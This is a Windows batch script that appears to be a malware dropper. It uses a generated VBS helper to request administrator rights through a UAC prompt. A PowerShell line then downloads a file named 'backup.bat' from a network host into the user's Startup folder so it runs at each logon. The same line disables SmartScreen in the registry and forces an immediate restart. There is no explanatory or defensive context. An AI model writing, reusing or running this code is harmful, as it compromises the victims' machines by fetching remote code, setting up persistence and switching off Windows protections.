@echo off
set "batchPath=%~0"
setlocal DisableDelayedExpansion
set "vbsGetPrivileges=%temp%\OEgetPrivileges.vbs"
setlocal EnableExtensions

:: Batch script start
echo Set UAC = CreateObject^("Shell.Application"^) > "%vbsGetPrivileges%"
echo args = "" >> "%vbsGetPrivileges%"
echo For Each strArg in WScript.Arguments >> "%vbsGetPrivileges%"
echo args = args & """" & strArg & """" & " " >> "%vbsGetPrivileges%"
echo Next >> "%vbsGetPrivileges%"

if '%cmdCmd%'=='-1' goto getPrivileges
if '%cmdCmd%'=='1' goto gotPrivileges

:getPrivileges
    set "cmdCmd=1"
    setlocal DisableDelayedExpansion
    cscript //nologo "%vbsGetPrivileges%" %*
    if '%errorlevel%'=='9009' (  echo GetPrivileges requires administrator privileges.  echo Requesting administrative privileges...  goto UACPrompt  ) else (  if '%errorlevel%'=='0' (    echo ELEVATED - Proceeding with script  ) else (    echo The attempt to get administrative privileges failed.  )
  )
  goto gotPrivileges

:UACPrompt
    setlocal DisableDelayedExpansion
    set "batchPath=%~0"
    set "batchArgs="
    for %%x in (%*) do set "batchArgs=!batchArgs! "%%x""
    setlocal EnableDelayedExpansion
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\OEgetPrivileges.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""!batchPath! !batchArgs!""", "", "runas", 1 >> "%temp%\OEgetPrivileges.vbs"
    "%temp%\OEgetPrivileges.vbs" %*
    exit /B

:gotPrivileges
    if exist "%vbsGetPrivileges%" del "%vbsGetPrivileges%"


powershell -Command "Invoke-WebRequest -Uri 'http://192.168.1.102:80/backup.bat' -OutFile 'C:\Users\syedh\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\baaackup.bat'; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer /v SmartScreenEnabled /t REG_DWORD /d 0 /f; shutdown /r /t 0"
